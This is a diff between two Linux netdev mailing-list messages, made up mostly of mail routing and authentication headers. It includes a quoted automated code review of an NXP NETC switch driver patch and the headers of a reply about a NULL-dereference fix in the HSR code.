@@ -1,399 +1,529 @@
-Return-Path: <netdev+bounces-286477-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-286478-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id wImvLjGDAWoFcAEAu9opvQ
-	(envelope-from <netdev+bounces-286477-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:20:17 +0200
+	id wJqSIdqCAWpObwEAu9opvQ
+	(envelope-from <netdev+bounces-286478-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:18:50 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
-	by mail.lfdr.de (Postfix) with ESMTPS id 59A8650906C
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:20:17 +0200 (CEST)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
+	by mail.lfdr.de (Postfix) with ESMTPS id E06BC508FFC
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:18:49 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by tor.lore.kernel.org (Postfix) with ESMTP id 74EFC3023A5B
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 07:17:22 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id ADFAC3007F77
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 07:18:48 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id E1B7D377EA2;
-	Mon, 11 May 2026 07:17:20 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 324EC3644C6;
+	Mon, 11 May 2026 07:18:48 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nxp.com header.i=@nxp.com header.b="TVYAyd9g"
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="MBVaSU7i"
 X-Original-To: netdev@vger.kernel.org
-Received: from AS8PR04CU009.outbound.protection.outlook.com (mail-westeuropeazon11011057.outbound.protection.outlook.com [52.101.70.57])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F4019374E6D;
-	Mon, 11 May 2026 07:17:18 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.70.57
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 88265363C57
+	for <netdev@vger.kernel.org>; Mon, 11 May 2026 07:18:46 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.214.173
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778483840; cv=fail; b=QOOjVtGQWt6ottHyMtxRrtZwXIsLWzE0YMLe+7B2ORzutJleRG3FosW70UBks9P2cyEeyCSPjerHjVs56uD1vDIb1H8x/X3U5Y6o07EB/5tqSzl6MKP9ZMSA5WAr7763bTDvNbkS/tJ9hU2EQaa7LPT7g54QuMD1P3r7qNTEiBk=
+	t=1778483928; cv=pass; b=Zj60nJoJnnDwT2t+R7UXcXLPT7DRZLcjRjRGwDtDyHdMO1/yT/ghr3g/Ny84wfUPDgtKaA3QDKeZD7XzrajJ6s4hkpooytedjU3RNgMUn5vTx6pjipNwk2Jhb30k7uQb8lQaBGxtewcHPLD90wlNn8aFNmmPsHP4QcQ9/PQJuOo=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778483840; c=relaxed/simple;
-	bh=HR4SoSWWK7/pVFDq3BAtnNaWbeD9av/0GFD99p6U3as=;
-	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
-	 Content-Type:MIME-Version; b=jN+8irToIdnVWRGqc+7GigXR3vOvlQuvMkVcQEc0ZUtlUwFu31Seasc8d+0rM1hmyBBGS8vtOkgaHumdwGwFi5Yl1BYMlpQGlb6t13+I6rrAfPeZoMKEebyZ8y4QcakFcv4o+CRoW8Zmovs+FxLfSu8gwuYpFvBOnFk0fpKi2AU=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=nxp.com; spf=pass smtp.mailfrom=nxp.com; dkim=pass (2048-bit key) header.d=nxp.com header.i=@nxp.com header.b=TVYAyd9g; arc=fail smtp.client-ip=52.101.70.57
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=nxp.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nxp.com
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=MyVfVZvuHsnyX9xhgCIG9NPPkpoY1ldx2nTgat+OYrgFglxn6eeavP2rkrCFSA+Eg2ZXRmcYfULJY/9V66AVdugk3T7QEQDVE6dOK1czFU74AJm73hv78xTlNCzVLcsTlohnkQcWKIPkryOJSYFxrIPtv1+rqRD5gHCmTT6VsiXsUDzqnMrJNDOq6gvD5SOe7dGvQspiRwU29vOyve0kEkuGdBMnDk/yJwjPUqvBhU0rz5BgZ08h3qchxQaBl3BwVg9n6Sqc+BtE/7ULtU5k/OQO5PPelU2Ea8+UKkanQKYBfkCuiDWcI/kGVXp/I5DozpdHh7XRPrL7v+izR9WLuw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=xRS5TmrEKg7RXytcTXcpaOCY2vFS2mVxZ12suOM8L/w=;
- b=k/Qn7glTF+rIO2hWMdjw/+slAlGTNTuxs5vTyt/T9mrCX1MyGvrU25Di+1qZLza2QJZVNd1XC4LTCjsTB3HjMe/r7Ainl0avIqSKHYHfQPDSqNxbp6G9uxRq+n9qEbvQ7O82PlnCAuSsksZufdCqpUR0O27b+PBdnfFUT7VDHg6YaTSOKdfyRLmi8AcQpVOh4lTa+QJ3rERq0bdNJaDcpjwPDSkrNg5ND6BAn7qWZN3JXHHQSZo2Vvwi8N4PWhC/kR81hdp72i7MNZwt30bHgoRmfPUq+MIjwJfXQVqysPUVF5i9ACYwhN8PurKTnGc0YYMSljH/LPvvmkw0kxR7KA==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=nxp.com; dmarc=pass action=none header.from=nxp.com; dkim=pass
- header.d=nxp.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nxp.com; s=selector1;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=xRS5TmrEKg7RXytcTXcpaOCY2vFS2mVxZ12suOM8L/w=;
- b=TVYAyd9gC3/vh8oB6KX88SGfAq2dtXBmZSucH88hwC+PHT6cz1nyd6mvf4hRAXWSKrqP0KVjop6BSzRbSzvv/XnKDGqpdolIkSSGAryucghyRqaY4Z0AV3zOrzONAeIwd4SrMWDeRa4Q2+e9uVRJ0SVk06vU2Ny3idpeQ/6xKgCAbIyZ2CyAbSVXyRF3JiUarn+QJyfgcqt6QpzeXLYDDVCjqeIG1R1QXmH/AGuoGvuple/XUsx9XiLoimoo9oFyxdmlvb9MknmgsSd92cDBo2q0GaS13iuiLr2mHCV6pZrvQ3Qold1iaxQzRtU0gJjQGIenyjLo/5YF4rIL9A8iPw==
-Received: from PA4PR04MB7502.eurprd04.prod.outlook.com (2603:10a6:102:ef::21)
- by GV1PR04MB10893.eurprd04.prod.outlook.com (2603:10a6:150:209::12) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9891.22; Mon, 11 May
- 2026 07:17:14 +0000
-Received: from PA4PR04MB7502.eurprd04.prod.outlook.com
- ([fe80::ff73:c7b3:5306:2ba0]) by PA4PR04MB7502.eurprd04.prod.outlook.com
- ([fe80::ff73:c7b3:5306:2ba0%3]) with mapi id 15.20.9891.021; Mon, 11 May 2026
- 07:17:14 +0000
-From: Wei Fang <wei.fang@nxp.com>
-To: "sashiko@lists.linux.dev" <sashiko@lists.linux.dev>
-CC: "imx@lists.linux.dev" <imx@lists.linux.dev>, "conor+dt@kernel.org"
-	<conor+dt@kernel.org>, "krzk+dt@kernel.org" <krzk+dt@kernel.org>,
-	"devicetree@vger.kernel.org" <devicetree@vger.kernel.org>,
-	"Frank.Li@kernel.org" <Frank.Li@kernel.org>, "robh@kernel.org"
-	<robh@kernel.org>, Networking <netdev@vger.kernel.org>
-Subject: RE: [PATCH v6 net-next 10/15] net: dsa: netc: introduce NXP NETC
- switch driver for i.MX94
-Thread-Topic: [PATCH v6 net-next 10/15] net: dsa: netc: introduce NXP NETC
- switch driver for i.MX94
-Thread-Index: AQHc356gdXpPrsGmkU2EqCuxvHl7wrYHFd0AgAE+JsA=
-Date: Mon, 11 May 2026 07:17:14 +0000
-Message-ID:
- <PA4PR04MB750282C2004F177F08BF602A88382@PA4PR04MB7502.eurprd04.prod.outlook.com>
-References: <20260509102954.4116624-11-wei.fang@nxp.com>
- <20260510104836.BDD50C2BCB8@smtp.kernel.org>
-In-Reply-To: <20260510104836.BDD50C2BCB8@smtp.kernel.org>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=nxp.com;
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: PA4PR04MB7502:EE_|GV1PR04MB10893:EE_
-x-ms-office365-filtering-correlation-id: 3ac4a773-f464-4049-a7c6-08deaf2d53b5
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam:
- BCL:0;ARA:13230040|1800799024|19092799006|366016|376014|38070700021|18002099003|56012099003|22082099003;
-x-microsoft-antispam-message-info:
- 7DvbVGtLk5Yh6HY4gpCkhhfgg3M+njX4SxM9WA1o62VeZIHAeaDGqDPYyxqsfWPmsxIQb8iyQp16p/vA0NPglJdFesclGav11BpWhzJjY8gVizfxvYmYvPHszn73SbgZM601S5QepSzfd3/BJg0YkSWryxOlcqhcxOo3N1H8MMa0DPFG9xM6mtcPX4gaCA2zD1sO+rMlyIeBGkzL8aW58rYHucNZlcG635NqI+chiKN/WfumDKCJ7VA4A3xKsK5q6j7afeAdu6ySZ7005FqXb3mFaa/VPzNWGdGEB1397JR7biEAzVcuFC6K5+gSgTVdiBnmfv5BPbsAYlt+2KqYg//3fRKCtMAd2NUg2Gtr67ydt0WU37kNvi62N0EsI/uYoM747+DVzSKe8Ltj+jsOApdjYQkGxNn3FiXMtcDUcWVhx5sxMQnxp+8TgaDMiW0fKl+mvYdvoDl6MBN993rSpX24DavKZual+ehS73IeRmcwgabJuN3kMuB9rvLaB78CZbWwV8my6exPeRogyQZ8iG03MCe1DIg1y1ly36vIf2hHFkJmkRtmnkdDxyS/F6o3SVgW0GoStjyPHPJVzERh+Ycm/fIss9oFXyjEZ3Pokj8misFXGrRyc6PlSAFKFapCJ7Cbet/u+0bsdJ8ReBCDjsHU+a5cPpEtK8+ojg+ZwDt6SpdlrerJEVP6iKi67h6ctB1qU1rKObarvba19cEgzbIfg4fJQ0+P4LTp8wsOi9xx3oPGQ9zT9j21ZFf/Tn2H
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PA4PR04MB7502.eurprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(19092799006)(366016)(376014)(38070700021)(18002099003)(56012099003)(22082099003);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?koi8-r?Q?kUyjXHYXYSvhhQs1wEiXkSKUNjjAyMgjIrGKzIYNCUFjrTWjKlMKET5hDXuf3T?=
- =?koi8-r?Q?OusyUTIsv29KT+WhBOo1zgF2ECz815eP8z0sh1xILXQQD718CAL86iqiJJbxvM?=
- =?koi8-r?Q?do1+ulFhAsSWF0OHwMSXkS7mqDrPt5Xg/OAxo9pqaw2SY+8Jeh3bet57IdulU7?=
- =?koi8-r?Q?0vUawicQ1VF26ogkwN6Jo5GumWqCtVKZHrAdualcqrr2gfGNYi6icQ3OqzYShG?=
- =?koi8-r?Q?pq0uJZD/vBWpP7Fptpq1A0CYj/XyMotFumlnbL9dCzrq0kW6d82HrQqGNcZlrc?=
- =?koi8-r?Q?mwo4SewBPXBvM8juGbel8LnThSNjXJ4BhOw6K+rD4pyQPudGc/QP1k5HTDEPus?=
- =?koi8-r?Q?JZRhs0bfm8F7DeBqBDIqM9KDh7ca7u3ZUhoY06q0b0CE+5EtkAvV4Jjzr+M5D/?=
- =?koi8-r?Q?Ivct6mQ0NuOolzUZ2hjNAqDhuxfBpGvkavNvM137Zo+efWQz+RvGQGblzD9xo+?=
- =?koi8-r?Q?sMJIRJQXdrc6JlpIFUG0qaoLo0eyC/suiFDlV8X80nvyrIYjr8ojrcILsdkDQm?=
- =?koi8-r?Q?rz49gEmmfL797ZOZevBnMSrMi/oio4EgAoBQ46BL1R1ZoBPVliPOt+xnvSbzZ5?=
- =?koi8-r?Q?Y51RAxVHSeO299eaqRxSgMnmKaMXBhQ0XiZcALUY0r+/8t8jGzaJDegmyrBLN+?=
- =?koi8-r?Q?el/Ki42BjqWAv5u3Rde4wtPRra3mL6ux1ORWBVmvfNBWmTIWKG7sZ8KOYihY46?=
- =?koi8-r?Q?ooZRm5abYldkOb2n9geGC8YWfnzeBrsNE7GTyog9bVonEjrG8wc1M4izQT4iHk?=
- =?koi8-r?Q?S1GOeh3u0MAApL9mf3R7i3dGDfrpClzk3q9WF78dFk2EQKQM9tWJuQid6ORUX6?=
- =?koi8-r?Q?xXxOZd2IIYHRMeZEeoIQvde7T0swBdZ89WNlChMb6YF+xm0dB57VHMrMf4iC6L?=
- =?koi8-r?Q?L/USvmrrImqUjL/QcfhodTrRmGbeW6A9qbBveXUzvnzY44bAOMJa3A+MYeXza5?=
- =?koi8-r?Q?7E8mXueuR3nJPzdmXwHCTu/CjV4PgYt7TFHDPKvaXmA/yTPy5m1+s0Rf70YljR?=
- =?koi8-r?Q?fQuC8TGvnFuy1UcDsSqLawBNTwFHISzgPcAh+7+DY6J7pQpuCNgQvqeYfRndH/?=
- =?koi8-r?Q?YtwOhHvcS6heSJr4i4TeLhjo2Rda0OW6CDjj0Is9nEZmgtJ5n+6gXgNsJutxDt?=
- =?koi8-r?Q?XvUXMgy3+fZeHWvWSwOq73Qwv1Qv1Lz8UohMFI21A6LlnmNsAUznv6VYaPzrX6?=
- =?koi8-r?Q?0dCMkXv1AVjVSPbGQo/3N/omjwkyAqrnDU1ZpE5gi6Flw1hnoGuarBGMd10A3y?=
- =?koi8-r?Q?2nqfBi+ftgLzrnMSJiPEgRGldNvWFO0GL23nzFa8NsPcQgqsFNnKtgNd9m3gUL?=
- =?koi8-r?Q?U7Hj7v+NdOIXVB+glfoMV1u3iirGUyBZRaYxNmqRkYfm+jqgRDwINTTa/k5hWZ?=
- =?koi8-r?Q?24ZchDljLFmbp+L7gkGuVF03y0013aULlYEven/Xt9yxku85cKFPBwGKLg0206?=
- =?koi8-r?Q?ZDSlvS3Y6jC4j64DBQ8PeQjrPkIC257q4X+HAHEOeymSudOAaA4MlROjHN3IZ5?=
- =?koi8-r?Q?O95uoSoTAhuJkTocpegA2Jv24RJsxNFLRmz/NM2izdv0w+rNCj4oubg2gKXZ33?=
- =?koi8-r?Q?9wa1lIXp+xOOk2x/B4uEMQn23v1otVqmwms2K8hVmBk4/t4kO74bpLOn0D8BSH?=
- =?koi8-r?Q?EvI0Ks2LbXaRns225DxKHuVDldQWVl16qRpacgG+y+ftdTbua8mFkS?=
-Content-Type: text/plain; charset="koi8-r"
-Content-Transfer-Encoding: quoted-printable
+	s=arc-20240116; t=1778483928; c=relaxed/simple;
+	bh=+tWo1oQ9+UfY8Szwii33XaifsT0b/LWHcpEIDDlu2AI=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=U29pA6scuJ5/fGD6v92X5ny3sf9IZq/0boyXBmQZVZ/uiw8rGOY94l5Fjr39j1VnIisk2uB0V723aC81pZbgZG9pLaaJHUu/7y0Wl7gi2ZaXuvLqvvETyL7gMaF7lTE7IkXzs8J4WEGZwjIFnMjQI0Dr7DaxKUZ0gTymw/cwWyQ=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=MBVaSU7i; arc=pass smtp.client-ip=209.85.214.173
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
+Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2ba6485d219so24740425ad.3
+        for <netdev@vger.kernel.org>; Mon, 11 May 2026 00:18:46 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1778483926; cv=none;
+        d=google.com; s=arc-20240605;
+        b=Y8sxK+JHblathJ6i+TkfQPY7MHT2u5vL9ZaeZ6tKQf/OS7u4AYNa1QYGTK7HuhGpbb
+         p/SVqQbXKgxBuQ6NNEj7TjkeK9yc7t6fAntdTPPX+hhNIVwh4RTt5nuJxIkxEr9fV/Jc
+         XGX4lFHrWyb14aF/YZwMRox53iraNZE+FE5EVrdmZmrIuz1yMWAhLosD9dLyjTe39GGA
+         v0eMjou1CzYOcJN74Ws27QDkIPAG11Ky6KTuutqFyxQ/Djc8R7jVhX+16V9TLSYSRTZD
+         6Vno5a6pgdhaiLM2oytm8ZfF+mrTiF9JuapZrF32OwfkQiBrGl+QlIRc3/tRKNhf29DW
+         Ylww==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
+        fh=R66GyqD97wIPpAYdlWBYKedTesGQ2p0XJTiRoa4gmro=;
+        b=da2oi/vMv0u3SSPK5fUlef7M+dWz10B2JvY0+yyfmf2MUTPxZRC7cZaUtRM/Mfj1S2
+         0HpfTqDziJhwKlHQTKfuaAHo1y6J8uqD8B3a0dmEFY5jIfILj0zEgfXGQltS2xQv1Lh5
+         NTC2EJ6GaJAzMmDWiYv3zuxFDkQsxorT04Opq91FNPyhXuMIolxL9XFnl45sJdnVKLr4
+         tQXPXguzzkvyi116nBeVmzGFvGwQE6q0Hgd93JtU+x9DRgmleI6a6m0vaV8zIfRirKvM
+         0x5IZG09tmYu+kKHP0Hn26llwqKLvGdJDEh3WhHN+SUX060r7Xzu6gQFXmmFNhvRu1Zo
+         GrVg==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=asu.edu; s=google; t=1778483926; x=1779088726; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
+        b=MBVaSU7iwZrYBEwgpVqbP4ZGUHPLSgKuyZMcmNmFf7j67kPMenfEhH2ebM4qXCwfFF
+         6Dxrqjjrbs9nECC9k0Eq/4zTPC0wtWhz4XaGOwKgbEiqX1GVlQhdybBd6vslanpOCFVZ
+         Zg/NXWNBl57LI/Vth8sJuMUzrU16SFtNUkKS3Kv97BbCbiP6Ih1mLbSvYtFt9ScBp7uI
+         F4k+USbV+TCDX5Sw/G4mbhW2JQas9ogxk3XQNIejzEYaoNGEBFpDxuSqrGzLDndH7KDR
+         2OArzymcUtECKa4idniWYDvm5dmBKa0YOHvHoSbEHck7E+c4byusasXa4ZAWFly8h85H
+         T69w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1778483926; x=1779088726;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
+        b=nNNgqisVHN0NhYC8PGjfqMQN8Pwp0d/r8Le7D0txDLepqtDRULAouM7DeTQwCOklqo
+         yAi8ScValJPNtHhfI8J8M57aIk/bZMJcw7uiMwr1rZC9dmIAAujUSwwJ5hW21RBkqp1g
+         j4F7y495Ur0mpiN5v/G0Bu3Gemk0pMF7i8PGkEcVuA7k+WBbTQBBrQgaPO7SYgRmmkRK
+         ox5vYjmnpp31rd5SHl1NAQL1Q4U24LQhJFKzmgXdLFQaPuTkHNK56DjszixefGPrPqPx
+         klIg7ek6TmFgwQeV9Rqm60i3AP2Ht+zPMTKv/HqK1nBkdzDqCILJDmXGa8bEiAJSisyj
+         zHEQ==
+X-Gm-Message-State: AOJu0Yw0BRT5hlKF9PZL3jViO9RRF3dhOdWdg3tle8PHT4Aug3Kpj8Ef
+	IgKRqFpHTiyTpBgX+66SYTodsgODZ9+eycGfttipl8Cg+VNS4n7Hzx9jQw/AFKOY7TxMczU1PQ6
+	oLIM3R80IytfChrPLG7UyWMPGQMt0r79XVLMtqUNWpl/U9LXN+2K1s95KYFo=
+X-Gm-Gg: Acq92OGjupCZhby7eAdytLpcwneY5nKyS1/+DuP7RcMVVLRZGrI1NIKO9KCyx/U26Sj
+	rQf/fzyYM4Ld2A7gXoFnjuJZLMYVt9Lfr3LDkQFtBxQVJ1eklNdVi2JxPHcxbIccy5BZzpAFjSu
+	uxIKfN+jU/rWUYQ21tMeOvSKMdKkDXIyRiN3aXThD50sEYWZqKNI8YLYcB2wRxCXXJp4WNjToal
+	/BOHPFa5K9rWUaIUIG6BPNfJRJcRoumGznMLugrnn+5EKJw+c9k+5+vwd8ZblzPUqSHbK9S3BXm
+	TaqJnFaJhOuAa3cwCIc=
+X-Received: by 2002:a17:903:8c5:b0:2ba:60a:3105 with SMTP id
+ d9443c01a7336-2ba78f7812fmr243707685ad.9.1778483925670; Mon, 11 May 2026
+ 00:18:45 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-OriginatorOrg: nxp.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: PA4PR04MB7502.eurprd04.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 3ac4a773-f464-4049-a7c6-08deaf2d53b5
-X-MS-Exchange-CrossTenant-originalarrivaltime: 11 May 2026 07:17:14.5819
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 686ea1d3-bc2b-4c6f-a92c-d99c5c301635
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: Jlpj7JQaL0eALSBCp0Lp1PbVMY2pO1ieH6zcDUUSlQWn1zHq89l8nds8nrlEoMODQAgvDr9AjPksl7ViPBNrBg==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: GV1PR04MB10893
-X-Rspamd-Queue-Id: 59A8650906C
+References: <20260511071517.3013445-1-xmei5@asu.edu>
+In-Reply-To: <20260511071517.3013445-1-xmei5@asu.edu>
+From: Xiang Mei <xmei5@asu.edu>
+Date: Mon, 11 May 2026 00:18:33 -0700
+X-Gm-Features: AVHnY4Lr1j5MRE8Jfs-vXihMD-zV8VWM0fVn8lCrM8o6M5SOgVsUgUodgfV6YjI
+Message-ID: <CAPpSM+Te4L_Z=rANT_Sg2f4Ng0dqj9LuMdq5BQYXfKS5=JFrag@mail.gmail.com>
+Subject: Re: [PATCH net] net: hsr: fix NULL deref in hsr_get_node_data
+To: netdev@vger.kernel.org
+Cc: fmaurer@redhat.com, kuba@kernel.org, pabeni@redhat.com, 
+	edumazet@google.com, davem@davemloft.net, horms@kernel.org, 
+	linux-kernel@vger.kernel.org, bestswngs@gmail.com
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: E06BC508FFC
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [-0.16 / 15.00];
-	ARC_REJECT(1.00)[cv is fail on i=2];
-	DMARC_POLICY_ALLOW(-0.50)[nxp.com,none];
-	R_DKIM_ALLOW(-0.20)[nxp.com:s=selector1];
-	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
+X-Spamd-Result: default: False [3.34 / 15.00];
+	SEM_URIBL(3.50)[asu.edu:email,asu.edu:dkim];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
+	BAD_REP_POLICIES(0.10)[];
 	HAS_LIST_UNSUB(-0.01)[];
-	TAGGED_FROM(0.00)[bounces-286477-lists,netdev=lfdr.de];
-	RCVD_TLS_LAST(0.00)[];
 	FROM_HAS_DN(0.00)[];
-	MIME_TRACE(0.00)[0:+];
-	TO_DN_EQ_ADDR_SOME(0.00)[];
-	TO_DN_SOME(0.00)[];
-	DKIM_TRACE(0.00)[nxp.com:+];
-	MISSING_XM_UA(0.00)[];
+	DMARC_POLICY_ALLOW(0.00)[asu.edu,none];
+	FREEMAIL_CC(0.00)[redhat.com,kernel.org,google.com,davemloft.net,vger.kernel.org,gmail.com];
+	TAGGED_FROM(0.00)[bounces-286478-lists,netdev=lfdr.de];
+	RCVD_TLS_LAST(0.00)[];
+	R_DKIM_ALLOW(0.00)[asu.edu:s=google];
+	DKIM_TRACE(0.00)[asu.edu:+];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
-	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[wei.fang@nxp.com,netdev@vger.kernel.org];
+	RCVD_COUNT_THREE(0.00)[4];
 	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	NEURAL_HAM(-0.00)[-1.000];
-	TAGGED_RCPT(0.00)[netdev,dt];
-	RCPT_COUNT_SEVEN(0.00)[8];
-	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,nxp.com:email,nxp.com:dkim]
+	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
+	MIME_TRACE(0.00)[0:+];
+	TO_DN_NONE(0.00)[];
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
+	MISSING_XM_UA(0.00)[];
+	NEURAL_HAM(-0.00)[-0.851];
+	TAGGED_RCPT(0.00)[netdev];
+	RCPT_COUNT_SEVEN(0.00)[9];
+	ARC_ALLOW(0.00)[subspace.kernel.org:s=arc-20240116:i=2];
+	R_SPF_ALLOW(0.00)[+ip4:172.234.253.10:c];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid,asu.edu:email,asu.edu:dkim]
 X-Rspamd-Action: no action
 
-> Thank you for your contribution! Sashiko AI review found 3 potential issu=
-e(s) to
-> consider:
-> - [High] devres-managed functions are incorrectly used inside the DSA `.s=
-etup`
-> callback, leading to memory leaks and MDIO bus registration failures if t=
-he DSA
-> tree is unbound and rebound.
-> - [High] The driver's PCI shutdown callback fails to stop hardware DMA ri=
-ngs and
-> leaves PCI bus mastering enabled.
-> - [Low] Clearing the PCI driver data via pci_set_drvdata(pdev, NULL) in t=
-he
-> shutdown callback breaks potential subsequent unbind operations.
-> --
->=20
-> commit bee0164d1f3476eab41d58efbe3baf540bb03cda
-> Author: Wei Fang <wei.fang@nxp.com>
->=20
-> net: dsa: netc: introduce NXP NETC switch driver for i.MX94
->=20
-> This commit introduces the initial NXP NETC Ethernet switch driver for
-> the i.MX94 series. It provides basic probe and remove functionality, as
-> well as port capabilities and basic network setup.
->=20
-> > diff --git a/drivers/net/dsa/netc/netc_main.c
-> b/drivers/net/dsa/netc/netc_main.c
-> > index 0000000000000..8e3a3230226c3 100644
-> > --- /dev/null
-> > +++ b/drivers/net/dsa/netc/netc_main.c
->=20
-> [ ... ]
->=20
